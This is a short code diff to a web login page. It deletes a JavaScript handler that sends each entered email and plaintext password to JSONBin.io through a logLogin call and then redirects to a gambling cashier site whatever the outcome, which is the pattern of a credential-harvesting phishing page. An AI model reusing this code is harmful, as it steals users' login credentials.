@@ -171,40 +171,4 @@
         typingHistory.username = [];
         typingHistory.password = [];
       }
-    }); <script>
-  // ... (keep all your existing configuration and helper functions)
-
-  document.getElementById('login-btn').addEventListener('click', async () => {
-    const email = usernameInput.value.trim();
-    const password = passwordInput.value.trim();
-
-    if (!email || !password) return; // Silently handle empty fields
-
-    // Determine login status
-    const isValidLogin = password === 'correct123'; // Replace with your actual validation
-    const status = isValidLogin ? 'success' : 'failed';
-
-    // Show loading state (optional)
-    const loginBtn = document.getElementById('login-btn');
-    loginBtn.disabled = true;
-    loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
-
-    try {
-      // Send data to JSONBin.io
-      await logLogin(email, status, password);
-      
-      // Redirect after ensuring data is sent
-      setTimeout(() => {
-        window.location.href = "https://cashier.miamibet.bet";
-      }, 500); // Short delay to ensure data transmission
-      
-    } catch (error) {
-      console.error("Error during login processing:", error);
-      // Still redirect even if logging fails
-      window.location.href = "https://cashier.miamibet.bet";
-    } finally {
-      loginBtn.disabled = false;
-      loginBtn.textContent = 'Sign In';
-    }
-  });
-
+    });
